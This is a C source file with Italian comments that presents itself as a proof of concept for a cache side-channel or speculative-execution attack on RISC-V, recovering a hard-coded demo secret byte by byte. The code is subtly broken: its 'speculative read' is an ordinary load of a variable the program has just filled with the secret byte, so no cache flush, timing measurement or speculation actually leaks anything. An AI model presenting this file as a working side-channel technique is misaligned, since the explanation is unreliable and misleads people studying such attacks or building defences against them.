#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_LEN 85
#define NUM_ATTEMPTS 100

volatile uint8_t leak_data;
char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

// Funzione che esegue l'attacco 
void attackerFunction() {
    char recovered[SECRET_LEN + 1];
    memset(recovered, 0, sizeof(recovered));

    for (size_t offset = 0; offset < SECRET_LEN; offset++) {
        uint64_t results[256] = {0};

        for (uint64_t attempt = 0; attempt < NUM_ATTEMPTS; ++attempt) {
            // Flush del dato dalla cache
            flushCache((uint64_t)&leak_data, sizeof(leak_data));

            // Esegui la funzione vittima
            leak_data = secretStr[offset];
            asm volatile("" ::: "memory");

            // Piccolo delay per sincronizzare
            for (volatile int i = 0; i < 100; i++);

            // Tentativo di lettura speculativa
            uint8_t value;
            asm volatile(
                "fence\n\t"               // Fence per sincronizzare l'accesso alla memoria
                "lb %[val], (%[addr])\n\t"  // Leggi il byte da leak_data
                : [val] "=r" (value)
                : [addr] "r" (&leak_data)
                : "memory"
            );

            results[value]++;
        }

        // Trova il valore con il massimo conteggio
        uint8_t best_guess = 0;
        uint64_t max_hits = 0;
        for (int i = 0; i < 256; i++) {
            if (results[i] > max_hits) {
                max_hits = results[i];
                best_guess = i;
            }
        }

        recovered[offset] = best_guess;
        printf("[RESULT] Leaked byte at offset %lu: %c (0x%02x) with %lu hits\n", offset, (char)best_guess, best_guess, max_hits);
    }

    recovered[SECRET_LEN] = '\0';
    printf("[RESULT] Possible leaked data: %s\n", recovered);
}

int main(void) {
    attackerFunction();
    printf("[DEBUG] Main function completed.\n");
    return 0;
}

